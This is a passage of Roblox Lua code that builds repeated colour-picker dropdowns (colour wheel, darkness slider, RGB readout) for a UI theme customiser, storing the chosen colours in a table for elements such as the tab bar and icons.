clickblock_4.Position = UDim2.new(0.50000006, 0, 0.49999994, 0)
clickblock_4.Size = UDim2.new(1, 0, 1, 0)
clickblock_4.ZIndex = 2
clickblock_4.Font = Enum.Font.SourceSans
clickblock_4.Text = ""
clickblock_4.TextColor3 = Color3.fromRGB(0, 0, 0)
clickblock_4.TextSize = 14.000

if doesineediscool == true then

local colourWheel = ColourWheel_4
local wheelPicker = Picker_4

local rgb = rgb_4
local uiGradient = uiGradient_4
local darknessPicker = DarknessPicker_4
local darknessSlider = Slider_4

local colourDisplay = indicator_4


local uis = game:GetService("UserInputService")


local buttonDown = false
local movingSlider = false


local function updateColour(centreOfWheel)
	
	
	local colourPickerCentre = Vector2.new(
		wheelPicker.AbsolutePosition.X + (wheelPicker.AbsoluteSize.X/2),
		wheelPicker.AbsolutePosition.Y + (wheelPicker.AbsoluteSize.Y/2)
	)
	local h = (math.pi - math.atan2(colourPickerCentre.Y - centreOfWheel.Y, colourPickerCentre.X - centreOfWheel.X)) / (math.pi * 2)
	
	local s = (centreOfWheel - colourPickerCentre).Magnitude / (colourWheel.AbsoluteSize.X/2)
	
	local v = math.abs((darknessSlider.AbsolutePosition.Y - darknessPicker.AbsolutePosition.Y) / darknessPicker.AbsoluteSize.Y - 1)
	
	
	local hsv = Color3.fromHSV(math.clamp(h, 0, 1), math.clamp(s, 0, 1), math.clamp(v, 0, 1))
	

	colourDisplay.BackgroundColor3 = hsv
	local colors = hsv -- or any random HSV color
-- multiply the components by 255 and get the nearest number
local r,g,b = math.floor((colors.R*255)+0.5),math.floor((colors.G*255)+0.5),math.floor((colors.B*255)+0.5)
	rgb.Text = r..", "..g..", "..b
    COLORTABLE.TitleColour[1] = r
    COLORTABLE.TitleColour[2] = g
    COLORTABLE.TitleColour[3] = b
end


colourWheel.MouseButton1Down:Connect(function()
	buttonDown = true
end)

darknessPicker.MouseButton1Down:Connect(function()
	movingSlider = true
end)


uis.InputEnded:Connect(function(input)
	
	if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
	
	buttonDown = false
	movingSlider = false
end)


uis.InputChanged:Connect(function(input)
	
	if input.UserInputType ~= Enum.UserInputType.MouseMovement then return end
	
	
	local mousePos = uis:GetMouseLocation() - Vector2.new(0, game:GetService("GuiService"):GetGuiInset().Y)
	
	local centreOfWheel = Vector2.new(colourWheel.AbsolutePosition.X + (colourWheel.AbsoluteSize.X/2), colourWheel.AbsolutePosition.Y + (colourWheel.AbsoluteSize.Y/2))
	
	local distanceFromWheel = (mousePos - centreOfWheel).Magnitude
	
	
	if distanceFromWheel <= colourWheel.AbsoluteSize.X/2 and buttonDown then
		
		wheelPicker.Position = UDim2.new(0, mousePos.X - colourWheel.AbsolutePosition.X, 0, mousePos.Y - colourWheel.AbsolutePosition.Y)

		
	elseif movingSlider then
		
		darknessSlider.Position = UDim2.new(darknessSlider.Position.X.Scale, 0, 0, 
			math.clamp(
			mousePos.Y - darknessPicker.AbsolutePosition.Y, 
			0, 
			darknessPicker.AbsoluteSize.Y)
		)	
	end
	
	
	updateColour(centreOfWheel)
end)
end
end
start_8()

----------------

--Properties:

_9TabBar.Name = "9TabBar"
_9TabBar.Parent = RightCostum
_9TabBar.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
_9TabBar.Size = UDim2.new(0, 221, 0, 22)

titlesssssss.Name = "titlesssssss"
titlesssssss.Parent = _9TabBar
titlesssssss.AnchorPoint = Vector2.new(0, 0.5)
titlesssssss.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
titlesssssss.BackgroundTransparency = 1.000
titlesssssss.Position = UDim2.new(0.1402715, 0, 0.5, 0)
titlesssssss.Size = UDim2.new(0.511312246, 0, 1, 0)
titlesssssss.Font = Enum.Font.GothamMedium
titlesssssss.Text = "Tab Bar"
titlesssssss.TextColor3 = Color3.fromRGB(235, 235, 235)
titlesssssss.TextSize = 13.000
titlesssssss.TextXAlignment = Enum.TextXAlignment.Left

indicatorsssss.Name = "indicatorsssss"
indicatorsssss.Parent = _9TabBar
indicatorsssss.AnchorPoint = Vector2.new(1, 0.5)
indicatorsssss.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
indicatorsssss.Position = UDim2.new(1, 0, 0.522727251, 0)
indicatorsssss.Size = UDim2.new(-0.0328681208, 75, 0.681818187, 0)

cornerssssss.CornerRadius = UDim.new(0, 3)
cornerssssss.Name = "cornerssssss"
cornerssssss.Parent = indicatorsssss

rgbsssss.Name = "rgbsssss"
rgbsssss.Parent = indicatorsssss
rgbsssss.AnchorPoint = Vector2.new(0.5, 0.5)
rgbsssss.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
rgbsssss.BackgroundTransparency = 1.000
rgbsssss.Position = UDim2.new(0.5, 0, 0.5, 0)
rgbsssss.Size = UDim2.new(1, -14, 1, 0)
rgbsssss.Font = Enum.Font.Gotham
rgbsssss.Text = "255, 255, 255"
rgbsssss.TextColor3 = Color3.fromRGB(12, 12, 12)
rgbsssss.TextSize = 11.000

UICornerssss.CornerRadius = UDim.new(0, 3)
UICornerssss.Name = "UICornerssss"
UICornerssss.Parent = _9TabBar

ImageLabelssssss.Name = "ImageLabelssssss"
ImageLabelssssss.Parent = _9TabBar
ImageLabelssssss.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabelssssss.BackgroundTransparency = 1.000
ImageLabelssssss.Position = UDim2.new(0.0280000009, 0, 0.216000006, -4)
ImageLabelssssss.Size = UDim2.new(0, 18, 0, 18)
ImageLabelssssss.Image = "rbxassetid://3926307971"
ImageLabelssssss.ImageColor3 = Color3.fromRGB(42, 78, 199)
ImageLabelssssss.ImageRectOffset = Vector2.new(804, 4)
ImageLabelssssss.ImageRectSize = Vector2.new(36, 36)

------------
function start_a()
    local aTabBarDrop = Instance.new("Frame")
local cornerlllll = Instance.new("UICorner")
local containerlllll = Instance.new("Frame")
local cornerllllll = Instance.new("UICorner")
local ColourWheellllllll = Instance.new("ImageButton")
local UIAspectRatioConstraintllllll = Instance.new("UIAspectRatioConstraint")
local Pickerllllll = Instance.new("ImageLabel")
local DarknessPickerllllll = Instance.new("ImageButton")
local UIGradientlllll = Instance.new("UIGradient")
local Sliderlllll = Instance.new("ImageLabel")
local clickblocklllll = Instance.new("TextButton")

aTabBarDrop.Name = "a TabBarDrop"
aTabBarDrop.Parent = RightCostum
aTabBarDrop.AnchorPoint = Vector2.new(0.5, 0)
aTabBarDrop.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
aTabBarDrop.Position = UDim2.new(0.454732388, 0, 0.0572139286, 2)
aTabBarDrop.Size = UDim2.new(0.909464896, 0, -0.0643519685, 148)
aTabBarDrop.Visible = false
aTabBarDrop.ZIndex = 3
_9TabBar.MouseButton1Click:connect(function()
    if aTabBarDrop.Visible == true then
        aTabBarDrop.Visible = false
    else
        for i,v in pairs(RightCostum:GetChildren()) do
            if string.find(v.Name, "Drop") then
                v.Visible = false
            end
        end
        aTabBarDrop.Visible = true
    end
end)

cornerlllll.CornerRadius = UDim.new(0, 3)
cornerlllll.Name = "cornerlllll"
cornerlllll.Parent = aTabBarDrop

containerlllll.Name = "containerlllll"
containerlllll.Parent = aTabBarDrop
containerlllll.AnchorPoint = Vector2.new(0.5, 0.5)
containerlllll.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
containerlllll.Position = UDim2.new(0.500000179, 0, 0.49999994, 0)
containerlllll.Size = UDim2.new(1.00163865, -4, 0.99999994, -4)
containerlllll.ZIndex = 3

cornerllllll.CornerRadius = UDim.new(0, 3)
cornerllllll.Name = "cornerllllll"
cornerllllll.Parent = containerlllll

ColourWheellllllll.Name = "ColourWheellllllll"
ColourWheellllllll.Parent = containerlllll
ColourWheellllllll.Active = false
ColourWheellllllll.AnchorPoint = Vector2.new(0.5, 0.5)
ColourWheellllllll.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ColourWheellllllll.BackgroundTransparency = 1.000
ColourWheellllllll.BorderSizePixel = 0
ColourWheellllllll.Position = UDim2.new(0.309100389, 0, 0.512530446, 0)
ColourWheellllllll.Selectable = false
ColourWheellllllll.Size = UDim2.new(0.434449941, 0, 0.86922574, 0)
ColourWheellllllll.Image = "http://www.roblox.com/asset/?id=6020299385"

UIAspectRatioConstraintllllll.Name = "UIAspectRatioConstraintllllll"
UIAspectRatioConstraintllllll.Parent = ColourWheellllllll
UIAspectRatioConstraintllllll.AspectRatio = 1.000

Pickerllllll.Name = "Pickerllllll"
Pickerllllll.Parent = ColourWheellllllll
Pickerllllll.AnchorPoint = Vector2.new(0.5, 0.5)
Pickerllllll.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Pickerllllll.BackgroundTransparency = 1.000
Pickerllllll.BorderSizePixel = 0
Pickerllllll.Position = UDim2.new(0.5, 0, 0.5, 0)
Pickerllllll.Size = UDim2.new(0.0900257826, 0, 0.0900257975, 0)
Pickerllllll.Image = "http://www.roblox.com/asset/?id=3678860011"

DarknessPickerllllll.Name = "DarknessPickerllllll"
DarknessPickerllllll.Parent = containerlllll
DarknessPickerllllll.Active = false
DarknessPickerllllll.AnchorPoint = Vector2.new(0.5, 0.5)
DarknessPickerllllll.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DarknessPickerllllll.BackgroundTransparency = 1.000
DarknessPickerllllll.BorderSizePixel = 0
DarknessPickerllllll.Position = UDim2.new(0.657959282, 0, 0.503847122, 0)
DarknessPickerllllll.Selectable = false
DarknessPickerllllll.Size = UDim2.new(0.062522307, 0, 0.887292862, 0)
DarknessPickerllllll.ZIndex = 2
DarknessPickerllllll.Image = "rbxassetid://3570695787"
DarknessPickerllllll.ScaleType = Enum.ScaleType.Slice
DarknessPickerllllll.SliceCenter = Rect.new(100, 100, 100, 100)
DarknessPickerllllll.SliceScale = 0.120

UIGradientlllll.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0))}
UIGradientlllll.Rotation = 90
UIGradientlllll.Name = "UIGradientlllll"
UIGradientlllll.Parent = DarknessPickerllllll

Sliderlllll.Name = "Sliderlllll"
Sliderlllll.Parent = DarknessPickerllllll
Sliderlllll.AnchorPoint = Vector2.new(0.5, 0.5)
Sliderlllll.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Sliderlllll.BackgroundTransparency = 1.000
Sliderlllll.BorderSizePixel = 0
Sliderlllll.Position = UDim2.new(0.491197795, 0, 0.0733607039, 0)
Sliderlllll.Size = UDim2.new(1.28656352, 0, 0.0265010502, 0)
Sliderlllll.ZIndex = 2
Sliderlllll.Image = "rbxassetid://3570695787"
Sliderlllll.ImageColor3 = Color3.fromRGB(255, 74, 74)
Sliderlllll.ScaleType = Enum.ScaleType.Slice
Sliderlllll.SliceCenter = Rect.new(100, 100, 100, 100)
Sliderlllll.SliceScale = 0.120

clickblocklllll.Name = "clickblocklllll"
clickblocklllll.Parent = aTabBarDrop
clickblocklllll.AnchorPoint = Vector2.new(0.5, 0.5)
clickblocklllll.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
clickblocklllll.BackgroundTransparency = 1.000
clickblocklllll.Position = UDim2.new(0.50000006, 0, 0.49999994, 0)
clickblocklllll.Size = UDim2.new(1, 0, 1, 0)
clickblocklllll.ZIndex = 2
clickblocklllll.Font = Enum.Font.SourceSans
clickblocklllll.Text = ""
clickblocklllll.TextColor3 = Color3.fromRGB(0, 0, 0)
clickblocklllll.TextSize = 14.000

LeftCostum.Name = "LeftCostum"
LeftCostum.Parent = UiCostum
LeftCostum.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LeftCostum.BackgroundTransparency = 1.000
LeftCostum.Size = UDim2.new(0, 243, 0, 367)

if doesineediscool == true then


local colourWheel = ColourWheellllllll
local wheelPicker = Pickerllllll

local rgb = rgbsssss
local uiGradient = UIGradientlllll
local darknessPicker = DarknessPickerllllll
local darknessSlider = Sliderlllll

local colourDisplay = indicatorsssss


local uis = game:GetService("UserInputService")


local buttonDown = false
local movingSlider = false


local function updateColour(centreOfWheel)
	
	
	local colourPickerCentre = Vector2.new(
		wheelPicker.AbsolutePosition.X + (wheelPicker.AbsoluteSize.X/2),
		wheelPicker.AbsolutePosition.Y + (wheelPicker.AbsoluteSize.Y/2)
	)
	local h = (math.pi - math.atan2(colourPickerCentre.Y - centreOfWheel.Y, colourPickerCentre.X - centreOfWheel.X)) / (math.pi * 2)
	
	local s = (centreOfWheel - colourPickerCentre).Magnitude / (colourWheel.AbsoluteSize.X/2)
	
	local v = math.abs((darknessSlider.AbsolutePosition.Y - darknessPicker.AbsolutePosition.Y) / darknessPicker.AbsoluteSize.Y - 1)
	
	
	local hsv = Color3.fromHSV(math.clamp(h, 0, 1), math.clamp(s, 0, 1), math.clamp(v, 0, 1))
	

	colourDisplay.BackgroundColor3 = hsv
	local colors = hsv -- or any random HSV color
-- multiply the components by 255 and get the nearest number
local r,g,b = math.floor((colors.R*255)+0.5),math.floor((colors.G*255)+0.5),math.floor((colors.B*255)+0.5)
	rgb.Text = r..", "..g..", "..b
    COLORTABLE.TabsBar[1] = r
    COLORTABLE.TabsBar[2] = g
    COLORTABLE.TabsBar[3] = b

end


colourWheel.MouseButton1Down:Connect(function()
	buttonDown = true
end)

darknessPicker.MouseButton1Down:Connect(function()
	movingSlider = true
end)


uis.InputEnded:Connect(function(input)
	
	if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
	
	buttonDown = false
	movingSlider = false
end)


uis.InputChanged:Connect(function(input)
	
	if input.UserInputType ~= Enum.UserInputType.MouseMovement then return end
	
	
	local mousePos = uis:GetMouseLocation() - Vector2.new(0, game:GetService("GuiService"):GetGuiInset().Y)
	
	local centreOfWheel = Vector2.new(colourWheel.AbsolutePosition.X + (colourWheel.AbsoluteSize.X/2), colourWheel.AbsolutePosition.Y + (colourWheel.AbsoluteSize.Y/2))
	
	local distanceFromWheel = (mousePos - centreOfWheel).Magnitude
	
	
	if distanceFromWheel <= colourWheel.AbsoluteSize.X/2 and buttonDown then
		
		wheelPicker.Position = UDim2.new(0, mousePos.X - colourWheel.AbsolutePosition.X, 0, mousePos.Y - colourWheel.AbsolutePosition.Y)

		
	elseif movingSlider then
		
		darknessSlider.Position = UDim2.new(darknessSlider.Position.X.Scale, 0, 0, 
			math.clamp(
			mousePos.Y - darknessPicker.AbsolutePosition.Y, 
			0, 
			darknessPicker.AbsoluteSize.Y)
		)	
	end
	
	
	updateColour(centreOfWheel)
end)
end
end
start_a()

----------------

_1Elements.Name = "1 Elements"
_1Elements.Parent = LeftCostum
_1Elements.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
_1Elements.Size = UDim2.new(0, 221, 0, 22)

title_5.Name = "title"
title_5.Parent = _1Elements
title_5.AnchorPoint = Vector2.new(0, 0.5)
title_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
title_5.BackgroundTransparency = 1.000
title_5.Position = UDim2.new(0.1402715, 0, 0.5, 0)
title_5.Size = UDim2.new(0.511312246, 0, 1, 0)
title_5.Font = Enum.Font.GothamMedium
title_5.Text = "Elements"
title_5.TextColor3 = Color3.fromRGB(235, 235, 235)
title_5.TextSize = 13.000
title_5.TextXAlignment = Enum.TextXAlignment.Left

indicator_5.Name = "indicator"
indicator_5.Parent = _1Elements
indicator_5.AnchorPoint = Vector2.new(1, 0.5)
indicator_5.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
indicator_5.Position = UDim2.new(1, 0, 0.522727251, 0)
indicator_5.Size = UDim2.new(-0.0328681208, 75, 0.681818187, 0)

corner_13.CornerRadius = UDim.new(0, 3)
corner_13.Name = "corner"
corner_13.Parent = indicator_5

rgb_5.Name = "rgb"
rgb_5.Parent = indicator_5
rgb_5.AnchorPoint = Vector2.new(0.5, 0.5)
rgb_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
rgb_5.BackgroundTransparency = 1.000
rgb_5.Position = UDim2.new(0.5, 0, 0.5, 0)
rgb_5.Size = UDim2.new(1, -14, 1, 0)
rgb_5.Font = Enum.Font.Gotham
rgb_5.Text = "240, 240, 240"
rgb_5.TextColor3 = Color3.fromRGB(12, 12, 12)
rgb_5.TextSize = 11.000

UICorner_5.CornerRadius = UDim.new(0, 3)
UICorner_5.Parent = _1Elements

ImageLabel_5.Parent = _1Elements
ImageLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_5.BackgroundTransparency = 1.000
ImageLabel_5.Position = UDim2.new(0.0280000009, 0, 0.216000006, -4)
ImageLabel_5.Size = UDim2.new(0, 18, 0, 18)
ImageLabel_5.Image = "rbxassetid://3926307971"
ImageLabel_5.ImageColor3 = Color3.fromRGB(42, 78, 199)
ImageLabel_5.ImageRectOffset = Vector2.new(804, 4)
ImageLabel_5.ImageRectSize = Vector2.new(36, 36)

--------
function start_3e()

local _2ElementsDrop = Instance.new("Frame")
local corner_14 = Instance.new("UICorner")
local container_5 = Instance.new("Frame")
local corner_15 = Instance.new("UICorner")
local ColourWheel_5 = Instance.new("ImageButton")
local UIAspectRatioConstraint_5 = Instance.new("UIAspectRatioConstraint")
local Picker_5 = Instance.new("ImageLabel")
local DarknessPicker_5 = Instance.new("ImageButton")
local UIGradient_5 = Instance.new("UIGradient")
local Slider_5 = Instance.new("ImageLabel")
local clickblock_5 = Instance.new("TextButton")
_2ElementsDrop.Name = "2 ElementsDrop"
_2ElementsDrop.Parent = LeftCostum
_2ElementsDrop.AnchorPoint = Vector2.new(0.5, 0)
_2ElementsDrop.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
_2ElementsDrop.Position = UDim2.new(0.454732507, 0, 0.0572139286, 2)
_2ElementsDrop.Size = UDim2.new(0.909465015, 0, -0.0643519685, 148)
_2ElementsDrop.Visible = false
_2ElementsDrop.ZIndex = 3
_1Elements.MouseButton1Click:connect(function()
    if _2ElementsDrop.Visible == true then
        _2ElementsDrop.Visible = false
    else
        for i,v in pairs(LeftCostum:GetChildren()) do
            if string.find(v.Name, "Drop") then
                v.Visible = false
            end
        end
        _2ElementsDrop.Visible = true
    end
end)
corner_14.CornerRadius = UDim.new(0, 3)
corner_14.Name = "corner"
corner_14.Parent = _2ElementsDrop

container_5.Name = "container"
container_5.Parent = _2ElementsDrop
container_5.AnchorPoint = Vector2.new(0.5, 0.5)
container_5.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
container_5.Position = UDim2.new(0.5, 0, 0.49999994, 0)
container_5.Size = UDim2.new(1.00163865, -4, 0.99999994, -4)
container_5.ZIndex = 3

corner_15.CornerRadius = UDim.new(0, 3)
corner_15.Name = "corner"
corner_15.Parent = container_5

ColourWheel_5.Name = "ColourWheel"
ColourWheel_5.Parent = container_5
ColourWheel_5.Active = false
ColourWheel_5.AnchorPoint = Vector2.new(0.5, 0.5)
ColourWheel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ColourWheel_5.BackgroundTransparency = 1.000
ColourWheel_5.BorderSizePixel = 0
ColourWheel_5.Position = UDim2.new(0.309100389, 0, 0.512530446, 0)
ColourWheel_5.Selectable = false
ColourWheel_5.Size = UDim2.new(0.434449941, 0, 0.86922574, 0)
ColourWheel_5.Image = "http://www.roblox.com/asset/?id=6020299385"

UIAspectRatioConstraint_5.Parent = ColourWheel_5
UIAspectRatioConstraint_5.AspectRatio = 1.000

Picker_5.Name = "Picker"
Picker_5.Parent = ColourWheel_5
Picker_5.AnchorPoint = Vector2.new(0.5, 0.5)
Picker_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Picker_5.BackgroundTransparency = 1.000
Picker_5.BorderSizePixel = 0
Picker_5.Position = UDim2.new(0.5, 0, 0.5, 0)
Picker_5.Size = UDim2.new(0.0900257826, 0, 0.0900257975, 0)
Picker_5.Image = "http://www.roblox.com/asset/?id=3678860011"

DarknessPicker_5.Name = "DarknessPicker"
DarknessPicker_5.Parent = container_5
DarknessPicker_5.Active = false
DarknessPicker_5.AnchorPoint = Vector2.new(0.5, 0.5)
DarknessPicker_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DarknessPicker_5.BackgroundTransparency = 1.000
DarknessPicker_5.BorderSizePixel = 0
DarknessPicker_5.Position = UDim2.new(0.657959282, 0, 0.503847122, 0)
DarknessPicker_5.Selectable = false
DarknessPicker_5.Size = UDim2.new(0.062522307, 0, 0.887292862, 0)
DarknessPicker_5.ZIndex = 2
DarknessPicker_5.Image = "rbxassetid://3570695787"
DarknessPicker_5.ScaleType = Enum.ScaleType.Slice
DarknessPicker_5.SliceCenter = Rect.new(100, 100, 100, 100)
DarknessPicker_5.SliceScale = 0.120

UIGradient_5.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0))}
UIGradient_5.Rotation = 90
UIGradient_5.Parent = DarknessPicker_5

Slider_5.Name = "Slider"
Slider_5.Parent = DarknessPicker_5
Slider_5.AnchorPoint = Vector2.new(0.5, 0.5)
Slider_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Slider_5.BackgroundTransparency = 1.000
Slider_5.BorderSizePixel = 0
Slider_5.Position = UDim2.new(0.491197795, 0, 0.0733607039, 0)
Slider_5.Size = UDim2.new(1.28656352, 0, 0.0265010502, 0)
Slider_5.ZIndex = 2
Slider_5.Image = "rbxassetid://3570695787"
Slider_5.ImageColor3 = Color3.fromRGB(255, 74, 74)
Slider_5.ScaleType = Enum.ScaleType.Slice
Slider_5.SliceCenter = Rect.new(100, 100, 100, 100)
Slider_5.SliceScale = 0.120

clickblock_5.Name = "clickblock"
clickblock_5.Parent = _2ElementsDrop
clickblock_5.AnchorPoint = Vector2.new(0.5, 0.5)
clickblock_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
clickblock_5.BackgroundTransparency = 1.000
clickblock_5.Position = UDim2.new(0.5, 0, 0.49999994, 0)
clickblock_5.Size = UDim2.new(1, 0, 1, 0)
clickblock_5.ZIndex = 2
clickblock_5.Font = Enum.Font.SourceSans
clickblock_5.Text = ""
clickblock_5.TextColor3 = Color3.fromRGB(0, 0, 0)
clickblock_5.TextSize = 14.000
if doesineediscool == true then


local colourWheel = ColourWheel_5
local wheelPicker = Picker_5

local rgb = rgb_5
local uiGradient = uiGradient_5
local darknessPicker = DarknessPicker_5
local darknessSlider = Slider_5

local colourDisplay = indicator_5


local uis = game:GetService("UserInputService")


local buttonDown = false
local movingSlider = false


local function updateColour(centreOfWheel)
	
	
	local colourPickerCentre = Vector2.new(
		wheelPicker.AbsolutePosition.X + (wheelPicker.AbsoluteSize.X/2),
		wheelPicker.AbsolutePosition.Y + (wheelPicker.AbsoluteSize.Y/2)
	)
	local h = (math.pi - math.atan2(colourPickerCentre.Y - centreOfWheel.Y, colourPickerCentre.X - centreOfWheel.X)) / (math.pi * 2)
	
	local s = (centreOfWheel - colourPickerCentre).Magnitude / (colourWheel.AbsoluteSize.X/2)
	
	local v = math.abs((darknessSlider.AbsolutePosition.Y - darknessPicker.AbsolutePosition.Y) / darknessPicker.AbsoluteSize.Y - 1)
	
	
	local hsv = Color3.fromHSV(math.clamp(h, 0, 1), math.clamp(s, 0, 1), math.clamp(v, 0, 1))
	

	colourDisplay.BackgroundColor3 = hsv
	local colors = hsv -- or any random HSV color
-- multiply the components by 255 and get the nearest number
local r,g,b = math.floor((colors.R*255)+0.5),math.floor((colors.G*255)+0.5),math.floor((colors.B*255)+0.5)
	rgb.Text = r..", "..g..", "..b
    COLORTABLE.Elements[1] = r
    COLORTABLE.Elements[2] = g
    COLORTABLE.Elements[3] = b

end


colourWheel.MouseButton1Down:Connect(function()
	buttonDown = true
end)

darknessPicker.MouseButton1Down:Connect(function()
	movingSlider = true
end)


uis.InputEnded:Connect(function(input)
	
	if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
	
	buttonDown = false
	movingSlider = false
end)


uis.InputChanged:Connect(function(input)
	
	if input.UserInputType ~= Enum.UserInputType.MouseMovement then return end
	
	
	local mousePos = uis:GetMouseLocation() - Vector2.new(0, game:GetService("GuiService"):GetGuiInset().Y)
	
	local centreOfWheel = Vector2.new(colourWheel.AbsolutePosition.X + (colourWheel.AbsoluteSize.X/2), colourWheel.AbsolutePosition.Y + (colourWheel.AbsoluteSize.Y/2))
	
	local distanceFromWheel = (mousePos - centreOfWheel).Magnitude
	
	
	if distanceFromWheel <= colourWheel.AbsoluteSize.X/2 and buttonDown then
		
		wheelPicker.Position = UDim2.new(0, mousePos.X - colourWheel.AbsolutePosition.X, 0, mousePos.Y - colourWheel.AbsolutePosition.Y)

		
	elseif movingSlider then
		
		darknessSlider.Position = UDim2.new(darknessSlider.Position.X.Scale, 0, 0, 
			math.clamp(
			mousePos.Y - darknessPicker.AbsolutePosition.Y, 
			0, 
			darknessPicker.AbsoluteSize.Y)
		)	
	end
	
	
	updateColour(centreOfWheel)
end)
end
end
start_3e()

UIListLayout_2.Parent = LeftCostum
UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout_2.Padding = UDim.new(0, 3)
-----------

_5ElementsIconColour.Name = "5 ElementsIconColour"
_5ElementsIconColour.Parent = LeftCostum
_5ElementsIconColour.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
_5ElementsIconColour.Size = UDim2.new(0, 221, 0, 22)

title_7.Name = "title"
title_7.Parent = _5ElementsIconColour
title_7.AnchorPoint = Vector2.new(0, 0.5)
title_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
title_7.BackgroundTransparency = 1.000
title_7.Position = UDim2.new(0.1402715, 0, 0.5, 0)
title_7.Size = UDim2.new(0.511312246, 0, 1, 0)
title_7.Font = Enum.Font.GothamMedium
title_7.Text = "Elements Icon Colour"
title_7.TextColor3 = Color3.fromRGB(235, 235, 235)
title_7.TextSize = 12.000
title_7.TextXAlignment = Enum.TextXAlignment.Left

indicator_7.Name = "indicator"
indicator_7.Parent = _5ElementsIconColour
indicator_7.AnchorPoint = Vector2.new(1, 0.5)
indicator_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
indicator_7.Position = UDim2.new(1, 0, 0.522727251, 0)
indicator_7.Size = UDim2.new(-0.0328681208, 75, 0.681818187, 0)

corner_21.CornerRadius = UDim.new(0, 3)
corner_21.Name = "corner"
corner_21.Parent = indicator_7

rgb_7.Name = "rgb"
rgb_7.Parent = indicator_7
rgb_7.AnchorPoint = Vector2.new(0.5, 0.5)
rgb_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
rgb_7.BackgroundTransparency = 1.000
rgb_7.Position = UDim2.new(0.5, 0, 0.5, 0)
rgb_7.Size = UDim2.new(1, -14, 1, 0)
rgb_7.Font = Enum.Font.Gotham
rgb_7.Text = "255, 255, 255"
rgb_7.TextColor3 = Color3.fromRGB(12, 12, 12)
rgb_7.TextSize = 11.000

UICorner_7.CornerRadius = UDim.new(0, 3)
UICorner_7.Parent = _5ElementsIconColour

ImageLabel_7.Parent = _5ElementsIconColour
ImageLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_7.BackgroundTransparency = 1.000
ImageLabel_7.Position = UDim2.new(0.0280000009, 0, 0.216000006, -4)
ImageLabel_7.Size = UDim2.new(0, 18, 0, 18)
ImageLabel_7.Image = "rbxassetid://3926307971"
ImageLabel_7.ImageColor3 = Color3.fromRGB(42, 78, 199)
ImageLabel_7.ImageRectOffset = Vector2.new(804, 4)
ImageLabel_7.ImageRectSize = Vector2.new(36, 36)


--------
function start_6e()
local _6ElementsIconColourDrop = Instance.new("Frame")
local corner_17 = Instance.new("UICorner")
local container_6 = Instance.new("Frame")
local corner_18 = Instance.new("UICorner")
local ColourWheel_6 = Instance.new("ImageButton")
local UIAspectRatioConstraint_6 = Instance.new("UIAspectRatioConstraint")
local Picker_6 = Instance.new("ImageLabel")
local DarknessPicker_6 = Instance.new("ImageButton")
local UIGradient_6 = Instance.new("UIGradient")
local Slider_6 = Instance.new("ImageLabel")
local clickblock_6 = Instance.new("TextButton")
_6ElementsIconColourDrop.Name = "6 ElementsIconColourDrop"
_6ElementsIconColourDrop.Parent = LeftCostum
_6ElementsIconColourDrop.AnchorPoint = Vector2.new(0.5, 0)
_6ElementsIconColourDrop.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
_6ElementsIconColourDrop.Position = UDim2.new(0.454732507, 0, 0.430672854, 2)
_6ElementsIconColourDrop.Size = UDim2.new(0.909465015, 0, -0.0643519685, 148)
_6ElementsIconColourDrop.Visible = false
_6ElementsIconColourDrop.ZIndex = 3
_5ElementsIconColour.MouseButton1Click:connect(function()
    if _6ElementsIconColourDrop.Visible == true then
        _6ElementsIconColourDrop.Visible = false
    else
        for i,v in pairs(LeftCostum:GetChildren()) do
            if string.find(v.Name, "Drop") then
                v.Visible = false
            end
        end
        _6ElementsIconColourDrop.Visible = true
    end
end)
corner_17.CornerRadius = UDim.new(0, 3)
corner_17.Name = "corner"
corner_17.Parent = _6ElementsIconColourDrop

container_6.Name = "container"
container_6.Parent = _6ElementsIconColourDrop
container_6.AnchorPoint = Vector2.new(0.5, 0.5)
container_6.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
container_6.Position = UDim2.new(0.5, 0, 0.49999994, 0)
container_6.Size = UDim2.new(1.00163865, -4, 0.99999994, -4)
container_6.ZIndex = 3

corner_18.CornerRadius = UDim.new(0, 3)
corner_18.Name = "corner"
corner_18.Parent = container_6

ColourWheel_6.Name = "ColourWheel"
ColourWheel_6.Parent = container_6
ColourWheel_6.Active = false
ColourWheel_6.AnchorPoint = Vector2.new(0.5, 0.5)
